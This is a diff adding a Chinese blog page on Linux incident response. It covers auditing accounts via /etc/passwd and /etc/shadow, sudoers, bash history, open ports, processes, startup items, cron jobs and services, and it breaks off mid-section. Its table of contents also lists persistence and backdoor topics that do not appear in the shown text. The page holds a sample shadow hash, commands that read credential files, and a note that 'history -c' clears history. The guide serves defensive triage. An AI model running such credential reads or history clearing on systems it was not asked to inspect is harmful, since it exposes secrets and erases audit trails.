@@ -1,0 +1,601 @@
+<!DOCTYPE html><html lang="zh"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="应急响应-Linux篇"><meta name="keywords" content="应急响应"><meta name="author" content="JGwebre,undefined"><meta name="copyright" content="JGwebre"><title>应急响应-Linux篇【JG的个人博客】</title><link rel="stylesheet" href="/css/fan.css"><link rel="stylesheet" href="/css/thirdparty/jquery.mCustomScrollbar.min.css"><link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css"><link rel="icon" href="/favicon.ico"><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/instantsearch.js@2.10.4/dist/instantsearch.min.css"><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/instantsearch.js@2.10.4/dist/instantsearch-theme-algolia.min.css"><script src="https://cdn.jsdelivr.net/npm/instantsearch.js@2.10.4"></script><!-- link(rel="dns-prefetch" href="https://cdn.jsdelivr.net")--><!-- link(rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/instantsearch.js@2.1.1/dist/instantsearch.min.css")--><!-- script(src="https://cdn.jsdelivr.net/npm/instantsearch.js@2.1.1/dist/instantsearch.min.js" defer)--><script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.9/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script><!-- script(src=url_for("/js/mathjax/mathjax.js"))--><script type="text/x-mathjax-config">MathJax.Hub.Config({
+    tex2jax: {inlineMath: [['$', '$'], ['\\(', '\\)']]}
+});
+</script><script>var isPassword = '' || false;
+if (isPassword) {
+    if (prompt('请输入文章密码') !== '') {
+        alert('密码错误！');
+        history.back();
+    }
+}</script><script>window.GLOBAL_CONFIG = {
+  root: '/',
+  algolia: {"appId":"M89DTZNQI5","apiKey":"3349454e63ed12455aa77088742476f1","indexName":"heisha","hits":{"per_page":10},"languages":{"input_placeholder":"搜索文章","hits_empty":"找不到您查询的内容:${query}","hits_stats":"找到 ${hits} 条结果，用时 ${time} 毫秒"}},
+  localSearch: {"path":"search.json","languages":{"hits_empty":"local_search.hits_empty"}},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  gitment: {},
+  valine: {"appId":"vBmF8qvDShMMqm39diUFWroM-gzGzoHsz","appKey":"vcClV59WM7pPzz3R46pITQlv","placeholder":"welcome to say something..."},
+  twikoo: {},
+}</script><meta name="generator" content="Hexo 7.3.0"><link rel="alternate" href="/atom.xml" title="JG的个人博客" type="application/atom+xml">
+</head><body><canvas id="universe"></canvas><!--#body--><div id="sidebar"><div class="toggle-sidebar-info button-hover"><span data-toggle="文章目录">站点概览</span></div><div class="sidebar-toc"><div class="sidebar-toc-title">目录</div><div class="sidebar-toc-progress"><span class="progress-notice">您已阅读了</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc-progress-bar"></div></div><div class="sidebar-toc-content" id="sidebar-toc-content"><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#Linux-%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5"><span class="toc-number">1.</span> <span class="toc-text">Linux 入侵排查</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#0x00-%E5%89%8D%E8%A8%80"><span class="toc-number">1.1.</span> <span class="toc-text">0x00 前言</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x01-%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5%E6%80%9D%E8%B7%AF"><span class="toc-number">1.2.</span> <span class="toc-text">0x01 入侵排查思路</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-1-%E8%B4%A6%E5%8F%B7%E5%AE%89%E5%85%A8"><span class="toc-number">1.2.1.</span> <span class="toc-text">1.1 账号安全</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#1-2-%E5%8E%86%E5%8F%B2%E5%91%BD%E4%BB%A4"><span class="toc-number">1.2.2.</span> <span class="toc-text">1.2 历史命令</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#1-3-%E6%A3%80%E6%9F%A5%E5%BC%82%E5%B8%B8%E7%AB%AF%E5%8F%A3"><span class="toc-number">1.2.3.</span> <span class="toc-text">1.3 检查异常端口</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#1-4-%E6%A3%80%E6%9F%A5%E5%BC%82%E5%B8%B8%E8%BF%9B%E7%A8%8B"><span class="toc-number">1.2.4.</span> <span class="toc-text">1.4 检查异常进程</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#1-5-%E6%A3%80%E6%9F%A5%E5%BC%80%E6%9C%BA%E5%90%AF%E5%8A%A8%E9%A1%B9"><span class="toc-number">1.2.5.</span> <span class="toc-text">1.5 检查开机启动项</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#1-6-%E6%A3%80%E6%9F%A5%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1"><span class="toc-number">1.2.6.</span> <span class="toc-text">1.6 检查定时任务</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#1-7-%E6%A3%80%E6%9F%A5%E6%9C%8D%E5%8A%A1"><span class="toc-number">1.2.7.</span> <span class="toc-text">1.7 检查服务</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#1-8-%E6%A3%80%E6%9F%A5%E5%BC%82%E5%B8%B8%E6%96%87%E4%BB%B6"><span class="toc-number">1.2.8.</span> <span class="toc-text">1.8 检查异常文件</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#1-9-%E6%A3%80%E6%9F%A5%E7%B3%BB%E7%BB%9F%E6%97%A5%E5%BF%97"><span class="toc-number">1.2.9.</span> <span class="toc-text">1.9 检查系统日志</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x02-%E5%B7%A5%E5%85%B7%E7%AF%87"><span class="toc-number">1.3.</span> <span class="toc-text">0x02 工具篇</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#2-1-Rootkit%E6%9F%A5%E6%9D%80"><span class="toc-number">1.3.1.</span> <span class="toc-text">2.1 Rootkit查杀</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-2-%E7%97%85%E6%AF%92%E6%9F%A5%E6%9D%80"><span class="toc-number">1.3.2.</span> <span class="toc-text">2.2 病毒查杀</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-3-webshell%E6%9F%A5%E6%9D%80"><span class="toc-number">1.3.3.</span> <span class="toc-text">2.3 webshell查杀</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-4-RPM-check-%E6%A3%80%E6%9F%A5"><span class="toc-number">1.3.4.</span> <span class="toc-text">2.4 RPM check 检查</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-5-Linux%E5%AE%89%E5%85%A8%E6%A3%80%E6%9F%A5%E8%84%9A%E6%9C%AC"><span class="toc-number">1.3.5.</span> <span class="toc-text">2.5 Linux安全检查脚本</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Linux%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90"><span class="toc-number">2.</span> <span class="toc-text">Linux日志分析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#0x00-%E5%89%8D%E8%A8%80-1"><span class="toc-number">2.1.</span> <span class="toc-text">0x00 前言</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x01-%E6%97%A5%E5%BF%97%E7%AE%80%E4%BB%8B"><span class="toc-number">2.2.</span> <span class="toc-text">0x01 日志简介</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x02-%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90%E6%8A%80%E5%B7%A7"><span class="toc-number">2.3.</span> <span class="toc-text">0x02 日志分析技巧</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#A%E3%80%81%E5%B8%B8%E7%94%A8%E7%9A%84shell%E5%91%BD%E4%BB%A4"><span class="toc-number">2.3.1.</span> <span class="toc-text">A、常用的shell命令</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#B%E3%80%81%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90%E6%8A%80%E5%B7%A7"><span class="toc-number">2.3.2.</span> <span class="toc-text">B、日志分析技巧</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Web%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90"><span class="toc-number">3.</span> <span class="toc-text">Web日志分析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#0x01-Web%E6%97%A5%E5%BF%97"><span class="toc-number">3.1.</span> <span class="toc-text">0x01  Web日志</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x02-%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90%E6%8A%80%E5%B7%A7-1"><span class="toc-number">3.2.</span> <span class="toc-text">0x02 日志分析技巧</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x03-%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90%E6%A1%88%E4%BE%8B"><span class="toc-number">3.3.</span> <span class="toc-text">0x03 日志分析案例</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x04-%E6%97%A5%E5%BF%97%E7%BB%9F%E8%AE%A1%E5%88%86%E6%9E%90%E6%8A%80%E5%B7%A7"><span class="toc-number">3.4.</span> <span class="toc-text">0x04 日志统计分析技巧</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Linux%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E2%80%93%E9%9A%90%E8%97%8F%E7%AF%87"><span class="toc-number">4.</span> <span class="toc-text">Linux权限维持–隐藏篇</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#0x00-%E5%89%8D%E8%A8%80-2"><span class="toc-number">4.1.</span> <span class="toc-text">0x00 前言</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x01-%E9%9A%90%E8%97%8F%E6%96%87%E4%BB%B6"><span class="toc-number">4.2.</span> <span class="toc-text">0x01 隐藏文件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x02-%E9%9A%90%E8%97%8F%E6%96%87%E4%BB%B6%E6%97%B6%E9%97%B4%E6%88%B3"><span class="toc-number">4.3.</span> <span class="toc-text">0x02 隐藏文件时间戳</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x03-%E9%9A%90%E8%97%8F%E6%9D%83%E9%99%90"><span class="toc-number">4.4.</span> <span class="toc-text">0x03 隐藏权限</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x04-%E9%9A%90%E8%97%8F%E5%8E%86%E5%8F%B2%E6%93%8D%E4%BD%9C%E5%91%BD%E4%BB%A4"><span class="toc-number">4.5.</span> <span class="toc-text">0x04 隐藏历史操作命令</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x05-%E9%9A%90%E8%97%8F%E8%BF%9C%E7%A8%8BSSH%E7%99%BB%E9%99%86%E8%AE%B0%E5%BD%95"><span class="toc-number">4.6.</span> <span class="toc-text">0x05 隐藏远程SSH登陆记录</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x06-%E7%AB%AF%E5%8F%A3%E5%A4%8D%E7%94%A8"><span class="toc-number">4.7.</span> <span class="toc-text">0x06 端口复用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x07-%E8%BF%9B%E7%A8%8B%E9%9A%90%E8%97%8F"><span class="toc-number">4.8.</span> <span class="toc-text">0x07 进程隐藏</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Linux%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E2%80%93%E5%90%8E%E9%97%A8%E7%AF%87"><span class="toc-number">5.</span> <span class="toc-text">Linux权限维持–后门篇</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1%E3%80%81%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%B7%BB%E5%8A%A0%E7%94%A8%E6%88%B7%E5%92%8C%E5%AF%86%E7%A0%81"><span class="toc-number">5.1.</span> <span class="toc-text">1、一句话添加用户和密码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2%E3%80%81SUID-Shell"><span class="toc-number">5.2.</span> <span class="toc-text">2、SUID Shell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3%E3%80%81ssh%E5%85%AC%E7%A7%81%E9%92%A5%E5%85%8D%E5%AF%86%E7%99%BB%E5%BD%95"><span class="toc-number">5.3.</span> <span class="toc-text">3、ssh公私钥免密登录</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4%E3%80%81%E8%BD%AF%E8%BF%9E%E6%8E%A5"><span class="toc-number">5.4.</span> <span class="toc-text">4、软连接</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5%E3%80%81SSH-wrapper"><span class="toc-number">5.5.</span> <span class="toc-text">5、SSH wrapper</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6%E3%80%81strace%E5%90%8E%E9%97%A8"><span class="toc-number">5.6.</span> <span class="toc-text">6、strace后门</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#7%E3%80%81crontab%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">5.7.</span> <span class="toc-text">7、crontab反弹shell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#8%E3%80%81openssh%E5%90%8E%E9%97%A8"><span class="toc-number">5.8.</span> <span class="toc-text">8、openssh后门</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#9%E3%80%81PAM%E5%90%8E%E9%97%A8"><span class="toc-number">5.9.</span> <span class="toc-text">9、PAM后门</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#10%E3%80%81rookit%E5%90%8E%E9%97%A8"><span class="toc-number">5.10.</span> <span class="toc-text">10、rookit后门</span></a></li></ol></li></ol></div></div><div class="author-info hide"><div class="author-info-avatar"><img class="author-info-avatar-img" src="/avatar.png"></div><div class="author-info-name">JGwebre</div><div class="author-info-description"></div><div class="links-buttons"><a class="links-button button-hover" href="https://github.com/heisha123" target="_blank">GitHub<i class="icon-dot bg-color1"></i></a><a class="links-button button-hover" href="mailto:gzyjslb@163.com" target="_blank">E-Mail<i class="icon-dot bg-color2"></i></a><a class="links-button button-hover" href="tencent://message/?uin=1852384503&amp;Site=&amp;Menu=yes" target="_blank">QQ<i class="icon-dot bg-color1"></i></a></div><div class="author-info-articles"><a class="author-info-articles-archives article-meta" href="/archives"><span class="pull-top">日志</span><span class="pull-bottom">17</span></a><a class="author-info-articles-tags article-meta" href="/tags"><span class="pull-top">标签</span><span class="pull-bottom">11</span></a><a class="author-info-articles-categories article-meta" href="/categories"><span class="pull-top">分类</span><span class="pull-bottom">1</span></a></div></div></div><div id="main-container"><header><div id="menu-outer"><i class="menu-list-icon fas fa-bars"></i><nav id="menu-inner"><a class="menu-item" href="/">首页</a><a class="menu-item" href="/tags">标签</a><a class="menu-item" href="/categories">分类</a><a class="menu-item" href="/archives">归档</a><a class="menu-item" href="/about">关于</a></nav><div class="right-info"><a class="search social-icon"><i class="fas fa-search"></i><span> 搜索</span></a><a class="title-name" href="/">JG的个人博客</a><span id="now-time"></span></div></div></header><div id="content-outer"><div id="content-inner"><article id="post"><div class="post-header"><div class="title">应急响应-Linux篇</div><div class="container"><time class="button-hover post-date"><i class="fas fa-calendar-alt article-icon" aria-hidden="true"></i> 发表于 2025-08-03 | 更新于 2025-08-03</time><!--time.button-hover.post-date #[i.fas.fa-calendar-alt.article-icon(aria-hidden="true")] #[=__('post.modified')] #[=date(page['updated'], config.date_format)]--><div class="button-hover categories"><i class="fa fa-inbox article-icon" aria-hidden="true"></i><a class="link-a" href="/categories/web%E5%AE%89%E5%85%A8/">web安全</a></div><div class="button-hover tags"><i class="fa fa-tag article-icon" aria-hidden="true"></i><a class="link-a" href="/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/">应急响应</a></div></div></div><div class="main-content"><h3 id="Linux-入侵排查"><a href="#Linux-入侵排查" class="headerlink" title="Linux 入侵排查"></a>Linux 入侵排查</h3><span id="more"></span>
+
+<h4 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h4><p>当企业发生黑客入侵、系统崩溃或其它影响业务正常运行的安全事件时，急需第一时间进行处理，使企业的网络信息系统在最短时间内恢复正常工作，进一步查找入侵来源，还原入侵事故过程，同时给出解决方案与防范措施，为企业挽回或减少经济损失。  </p>
+<p>针对常见的攻击事件，结合工作中应急响应事件分析和解决的方法，总结了一些 Linux 服务器入侵排查的思路。</p>
+<h4 id="0x01-入侵排查思路"><a href="#0x01-入侵排查思路" class="headerlink" title="0x01 入侵排查思路"></a>0x01 入侵排查思路</h4><h5 id="1-1-账号安全"><a href="#1-1-账号安全" class="headerlink" title="1.1 账号安全"></a>1.1 账号安全</h5><p><strong>基本使用：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">1、用户信息文件 /etc/passwd</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">account:password:UID:GID:GECOS:directory:shell</span><br><span class="line">用户名：密码：用户ID：组ID：用户说明：家目录：登陆之后的 shell</span><br><span class="line">注意：无密码只允许本机登陆，远程不允许登陆</span><br><span class="line"></span><br><span class="line">2、影子文件 /etc/shadow</span><br><span class="line">root:$6$oGs1PqhL2p3ZetrE$X7o7bzoouHQVSEmSgsYN5UD4.kMHx6qgbTqwNVC5oOAouXvcjQSt.Ft7ql1WpkopY0UV9ajBwUt1DpYxTCVvI/:16809:0:99999:7:::</span><br><span class="line">用户名：加密密码：密码最后一次修改日期：两次密码的修改时间间隔：密码有效期：密码修改到期到的警告天数：密码过期之后的宽限天数：账号失效时间：保留</span><br><span class="line"></span><br><span class="line">这里重点看有密码的也就是后面又hash值的，没有密码不能进行远程连接</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">who     查看当前登录用户（tty 本地登陆  pts 远程登录）</span><br><span class="line">w       查看系统信息，想知道某一时刻用户的行为</span><br><span class="line">uptime  查看登陆多久、多少用户，负载状态</span><br></pre></td></tr></table></figure>
+
+<p><strong>入侵排查：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">1、查询特权用户特权用户(uid 为0)</span><br><span class="line">[root@localhost ~]# awk -F: &#x27;$3==0&#123;print $1&#125;&#x27; /etc/passwd</span><br><span class="line">2、查询可以远程登录的帐号信息</span><br><span class="line">[root@localhost ~]# awk &#x27;/\$1|\$6/&#123;print $1&#125;&#x27; /etc/shadow</span><br><span class="line">这条awk命令的作用是从/etc/shadow文件中筛选出使用$1$（MD5 加密）或$6$（SHA-512 加密）算法存储密码的用户，并打印这些用户的用户名，也就是有hash密码的</span><br><span class="line">root@ubuntu:~# awk -F: &#x27;/\$1|\$6/&#123;print $1&#125;&#x27; /etc/shadow      #只会打印账号</span><br><span class="line">3、除root帐号外，其他帐号是否存在sudo权限。如非管理需要，普通帐号应删除sudo权限</span><br><span class="line">[root@localhost ~]# more /etc/sudoers | grep -v &quot;^#\|^$&quot; | grep &quot;ALL=(ALL)&quot;</span><br><span class="line">  先用more 读取 /etc/sudoers 然后通过第一个管道符 grep -v 进行反向匹配，也就是不包含 #开头 和空行，然   后在通过管道符 匹配权限ALL=(ALL)</span><br><span class="line">4、禁用或删除多余及可疑的帐号</span><br><span class="line">    usermod -L user    禁用帐号，帐号无法登录，/etc/shadow 第二栏为 ! 开头</span><br><span class="line">	userdel user       删除 user 用户</span><br><span class="line">	userdel -r user    将删除 user 用户，并且将 /home 目录下的 user 目录一并删除</span><br></pre></td></tr></table></figure>
+
+<h5 id="1-2-历史命令"><a href="#1-2-历史命令" class="headerlink" title="1.2 历史命令"></a>1.2 历史命令</h5><p><strong>基本使用：</strong></p>
+<p>通过 .bash_history 文件查看帐号执行过的系统命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">1、root 用户的历史命令</span><br><span class="line">histroy</span><br><span class="line">2、打开 /home 各帐号目录下的 .bash_history，查看普通帐号执行的历史命令。</span><br><span class="line">为历史的命令增加登录的 IP 地址、执行命令时间等信息：</span><br><span class="line">1）保存1万条命令</span><br><span class="line">sed -i &#x27;s/^HISTSIZE=1000/HISTSIZE=10000/g&#x27; /etc/profile</span><br><span class="line">有些系统 不会在这个地方，可以用grep -r HISTSIZE /etc 进行查看</span><br><span class="line"></span><br><span class="line">root@ubuntu:~# grep -r HISTSIZE /etc</span><br><span class="line">/etc/skel/.bashrc:# for setting history length see HISTSIZE and HISTFILESIZE in bash(1)</span><br><span class="line">/etc/skel/.bashrc:HISTSIZE=1000</span><br><span class="line"></span><br><span class="line">然后对应的进行修改文件</span><br><span class="line"></span><br><span class="line">2）在/etc/profile的文件尾部添加如下行数配置信息：</span><br><span class="line">######jiagu history xianshi#########</span><br><span class="line">USER_IP=`who -u am i 2&gt;/dev/null | awk &#x27;&#123;print $NF&#125;&#x27; | sed -e &#x27;s/[()]//g&#x27;`</span><br><span class="line">if [ &quot;$USER_IP&quot; = &quot;&quot; ]</span><br><span class="line">then</span><br><span class="line">USER_IP=`hostname`</span><br><span class="line">fi</span><br><span class="line">export HISTTIMEFORMAT=&quot;%F %T $USER_IP `whoami` &quot;</span><br><span class="line">shopt -s histappend</span><br><span class="line">export PROMPT_COMMAND=&quot;history -a&quot;</span><br><span class="line">######### jiagu history xianshi ##########</span><br><span class="line">3）source /etc/profile 让配置生效</span><br><span class="line">生成效果： 1  2018-07-10 19:45:39 192.168.204.1 root source /etc/profile</span><br><span class="line">3、历史操作命令的清除：history -c</span><br><span class="line">但此命令并不会清除保存在文件中的记录，因此需要手动删除 .bash_profile 文件中的记录。</span><br></pre></td></tr></table></figure>
+
+<p><strong>入侵排查：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">进入用户目录下，导出历史命令。</span><br><span class="line">cat .bash_history &gt;&gt; history.txt</span><br></pre></td></tr></table></figure>
+
+<h5 id="1-3-检查异常端口"><a href="#1-3-检查异常端口" class="headerlink" title="1.3 检查异常端口"></a>1.3 检查异常端口</h5><p>使用 netstat 网络连接命令，分析可疑端口、IP、PID</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">netstat -antlp | more    需要安装这个命令  apt install net-tools</span><br><span class="line"></span><br><span class="line">查看下 pid 所对应的进程文件路径，</span><br><span class="line">运行 ls -l /proc/$PID/exe 或 file /proc/$PID/exe（$PID 为对应的 pid 号）</span><br></pre></td></tr></table></figure>
+
+<h5 id="1-4-检查异常进程"><a href="#1-4-检查异常进程" class="headerlink" title="1.4 检查异常进程"></a>1.4 检查异常进程</h5><p>使用 ps 命令，分析进程</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps aux | grep pid </span><br></pre></td></tr></table></figure>
+
+<h5 id="1-5-检查开机启动项"><a href="#1-5-检查开机启动项" class="headerlink" title="1.5 检查开机启动项"></a>1.5 检查开机启动项</h5><p><strong>基本使用：</strong></p>
+<p>系统运行级别示意图：</p>
+<table>
+<thead>
+<tr>
+<th align="center">运行级别</th>
+<th align="center">含义</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">0</td>
+<td align="center">关机</td>
+</tr>
+<tr>
+<td align="center">1</td>
+<td align="center">单用户模式，可以想象为windows的安全模式，主要用于系统修复</td>
+</tr>
+<tr>
+<td align="center">2</td>
+<td align="center">不完全的命令行模式，不含NFS服务</td>
+</tr>
+<tr>
+<td align="center">3</td>
+<td align="center">完全的命令行模式，就是标准字符界面</td>
+</tr>
+<tr>
+<td align="center">4</td>
+<td align="center">系统保留</td>
+</tr>
+<tr>
+<td align="center">5</td>
+<td align="center">图形模式</td>
+</tr>
+<tr>
+<td align="center">6</td>
+<td align="center">重启动</td>
+</tr>
+</tbody></table>
+<p>查看运行级别命令 <code>runlevel</code></p>
+<p>系统默认允许级别</p>
+<pre><code>vi  /etc/inittab
+id=3：initdefault  #系统开机后直接进入哪个运行级别
+</code></pre>
+<p>开机启动配置文件</p>
+<pre><code>/etc/rc.local
+/etc/rc.d/rc[0~6].d
+</code></pre>
+<p>例子：当我们需要开机启动自己的脚本时，只需要将可执行脚本丢在 &#x2F;etc&#x2F;init.d 目录下，然后在 &#x2F;etc&#x2F;rc.d&#x2F;rc*.d 文件中建立软链接即可。</p>
+<p>注：此中的 * 代表 0,1,2,3,4,5,6 这七个等级</p>
+<pre><code>root@localhost ~]# ln -s /etc/init.d/sshd /etc/rc.d/rc3.d/S100ssh
+</code></pre>
+<p>此处sshd是具体服务的脚本文件，S100ssh是其软链接，S开头代表加载时自启动；如果是K开头的脚本文件，代表运行级别加载时需要关闭的。</p>
+<p><strong>入侵排查：</strong></p>
+<p>启动项文件：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">more /etc/rc.local</span><br><span class="line">/etc/rc.d/rc[0~6].d</span><br><span class="line">ls -l /etc/rc.d/rc3.d/</span><br></pre></td></tr></table></figure>
+
+<h5 id="1-6-检查定时任务"><a href="#1-6-检查定时任务" class="headerlink" title="1.6 检查定时任务"></a>1.6 检查定时任务</h5><p><strong>基本使用</strong></p>
+<p>1、利用 crontab 创建计划任务</p>
+<ul>
+<li><p>基本命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">crontab -l   列出某个用户cron服务的详细内容</span><br><span class="line"></span><br><span class="line">Tips：默认编写的crontab文件会保存在 (/var/spool/cron/用户名 例如: /var/spool/cron/root</span><br><span class="line"></span><br><span class="line">crontab -r   删除每个用户cront任务(谨慎：删除所有的计划任务)</span><br><span class="line"></span><br><span class="line">crontab -e   使用编辑器编辑当前的crontab文件 </span><br><span class="line"></span><br><span class="line">如：*/1 * * * * echo &quot;hello world&quot; &gt;&gt; /tmp/test.txt 每分钟写入文件</span><br></pre></td></tr></table></figure></li>
+</ul>
+<p>2、利用 anacron 命令实现异步定时任务调度</p>
+<ul>
+<li><p>使用案例</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">每天运行 /home/backup.sh 脚本：</span><br><span class="line">vi /etc/anacrontab </span><br><span class="line">@daily    10    example.daily   /bin/bash /home/backup.sh</span><br><span class="line">当机器在 backup.sh 期望被运行时是关机的，anacron会在机器开机十分钟之后运行它，而不用再等待 7天。</span><br></pre></td></tr></table></figure></li>
+</ul>
+<p><strong>入侵排查</strong></p>
+<p>重点关注以下目录中是否存在恶意脚本</p>
+<pre><code>/var/spool/cron/* 
+/etc/crontab
+/etc/cron.d/*
+/etc/cron.daily/* 
+/etc/cron.hourly/* 
+/etc/cron.monthly/*
+/etc/cron.weekly/
+/etc/anacrontab
+/var/spool/anacron/*
+</code></pre>
+<p>小技巧：</p>
+<pre><code>more /etc/cron.daily/*  查看目录下所有文件
+</code></pre>
+<h5 id="1-7-检查服务"><a href="#1-7-检查服务" class="headerlink" title="1.7 检查服务"></a>1.7 检查服务</h5><p><strong>服务自启动</strong></p>
+<p>第一种修改方法：</p>
+<pre><code>chkconfig [--level 运行级别] [独立服务名] [on|off]
+chkconfig –level  2345 httpd on  开启自启动
+chkconfig httpd on （默认level是2345）
+</code></pre>
+<p>第二种修改方法：</p>
+<pre><code>修改 /etc/re.d/rc.local 文件  
+加入 /etc/init.d/httpd start
